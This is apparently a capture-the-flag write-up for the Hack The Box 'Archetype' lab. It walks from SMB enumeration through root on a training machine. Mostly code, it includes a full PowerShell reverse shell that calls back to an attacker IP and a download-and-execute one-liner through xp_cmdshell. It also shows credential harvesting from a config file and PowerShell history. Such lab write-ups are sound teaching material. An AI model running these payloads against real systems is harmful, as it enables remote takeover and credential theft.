# Hack The Box - Archetype Writeup  
**Prepared by:** 0ne-nine9, ilinor  

---

## 🔍 Enumeration  

We begin by scanning the target with `nmap` using the default script (`-sC`) and version detection (`-sV`):

```bash
nmap -sC -sV 10.129.92.43
```

**Nmap results:**
```
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
```

### 🔎 SMB Enumeration

Attempt anonymous login to SMB to list all available shares:

```bash
smbclient -N -L \\\\10.129.92.43\\
```

Result shows the `backups` share is available.

### 🔑 Accessing the Backups Share

We connect directly:

```bash
smbclient \\\\10.129.92.43\\backups -U ""
```

Once inside, we list and download the only interesting file:

```bash
smb: \> dir
  prod.dtsConfig                   A     2896  Sat Jan 26 05:17:04 2019
smb: \> get prod.dtsConfig
```

This file is a **SQL Server configuration XML file**. It contains the **SQL credentials in cleartext**:

```xml
<ConfiguredValue>
  Data Source=.;
  Password=M3g4c0rp123;
  User ID=ARCHETYPE\sql_svc;
  Initial Catalog=Catalog;
  Provider=SQLNCLI10.1;
  Persist Security Info=True;
</ConfiguredValue>
```

✅ Extracted credentials:
- **Username:** ARCHETYPE\sql_svc  
- **Password:** M3g4c0rp123  

---

## 🎯 Initial Foothold: MSSQL Access via Impacket

Locate `mssqlclient.py` from Impacket:

```bash
cd /usr/share/doc/python3-impacket/examples
```

Run the client:

```bash
python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.92.43 -windows-auth
```

You’ll get a `SQL>` prompt if login is successful.

---

## 🧨 Enabling RCE via `xp_cmdshell`

By default, command execution via `xp_cmdshell` is disabled. We enable it step-by-step:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Verify execution:

```sql
EXEC xp_cmdshell 'whoami';
```

Should return:
```
archetype\sql_svc
```

At this point, **we have command execution as `sql_svc`** via SQL server.

---

## 🐚 Reverse Shell via PowerShell

### Step 1: Create Reverse Shell Payload

Create a file named `shell.ps1` on your attacker machine:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.23",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
}
```

### Step 2: Host It via Python HTTP Server

```bash
sudo python3 -m http.server 80
```

### Step 3: Start a Listener

```bash
sudo nc -lvnp 4444
```

### Step 4: Execute the Payload from SQL Server

```sql
EXEC xp_cmdshell "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.23/shell.ps1')";
```

💥 If successful, you now have a **PowerShell reverse shell** back to your Kali machine as `sql_svc`.

---

## 🕵️‍♂️ Enumerating System and Finding User Flag

Once inside:

```powershell
cd C:\Users\sql_svc\Desktop
type user.txt
```

✅ **User flag captured**

---

## 🔐 Privilege Escalation with winPEAS

### Step 1: Upload `winPEAS` to Target

Host it on attacker box:

```bash
sudo python3 -m http.server 80
```

On the target system:

```powershell
powershell -c "iwr http://10.10.14.23/winPEASx64.exe -outfile winpeas.exe"
```

If it fails, debug output to file:

```powershell
powershell -ep Bypass .\winpeas.exe *> output.txt
```

After verifying a clean file:

```powershell
powershell -ep Bypass .\winpeas.exe > output.txt
```

Inspect `output.txt`.

---

### 🧠 What We Found

Inside PowerShell history:

```powershell
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Found:

```plaintext
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

🔥 This is **cleartext admin password** for user `administrator`.

---

## 👑 Root Shell via Evil-WinRM

With the password in hand, connect with Evil-WinRM:

```bash
evil-winrm -i 10.129.92.43 -u administrator -p 'MEGACORP_4dm1n!!'
```

Once inside:

```powershell
cd C:\Users\Administrator\Desktop
type root.txt
```

✅ **Root flag captured**

---

## ✅ Summary of Steps

1. `nmap` reveals SMB and MSSQL
2. Anonymous access to `\\backups\` yields `prod.dtsConfig`
3. File reveals password `M3g4c0rp123` for `ARCHETYPE\sql_svc`
4. Login to MSSQL using Impacket `mssqlclient.py`
5. Enable `xp_cmdshell` and trigger PowerShell RCE
6. Host and run a PowerShell reverse shell to get foothold
7. Upload and execute `winPEAS`
8. Find `administrator` password in PowerShell history
9. Connect with `evil-winrm` and grab the root flag

🎉 **Box Complete: ARCHEtype Destroyed!**

---

## 🧭 Alternate Path - My Custom Exploitation Route

While the official guide used the `nc64.exe` binary to obtain a reverse shell, **my process differed in several key ways**, offering an equally effective but alternative approach. Here's how my path diverged:

### 🧃 Reverse Shell via PowerShell Script Injection Instead of Binary Upload

Instead of uploading and executing `nc64.exe`, I hosted and injected a **custom PowerShell reverse shell script** (`shell.ps1`) using `xp_cmdshell` and PowerShell’s `IEX` with `Net.WebClient.DownloadString`:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.23",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
}
```

### Execution via SQL:

```sql
EXEC xp_cmdshell "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.23/shell.ps1')";
```

🔁 This gave me an **interactive reverse PowerShell shell** over TCP **without needing to upload any binaries**.

---

### 🗃️ Directory Traversal to Access Writeable Path

To find a writeable path from the limited SQL context, I manually traversed with:

```powershell
cd ../../../
```

Eventually landing at:

```powershell
C:\Users\sql_svc\Downloads
```

This is where I downloaded `winpeas.ps1`.

---

### ⚙️ Troubleshooting winPEAS Execution

My first download of winPEAS failed. To debug, I redirected the output to a file:

```powershell
powershell -ep Bypass .\winpeas.ps1 *> output.txt
```

Upon discovering corruption, I re-downloaded the script and re-ran:

```powershell
powershell -ep Bypass .\winpeas.ps1 > output.txt
```

This led to successful execution and discovery of credentials.

---

### 🧾 Extracting the Admin Password via PowerShell History

Using:

```powershell
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

I retrieved the **Administrator credentials**:

```
Username: administrator
Password: MEGACORP_4dm1n!!
```

---

### 🛡️ Root Access via Evil-WinRM Instead of psexec.py

Instead of Impacket’s `psexec.py`, I used `evil-winrm` for a more interactive shell:

```bash
evil-winrm -i 10.129.92.43 -u administrator -p 'MEGACORP_4dm1n!!'
```

From there:

```powershell
cd C:\Users\Administrator\Desktop
type root.txt
```

🏁 **Root flag captured using Evil-WinRM!**

---
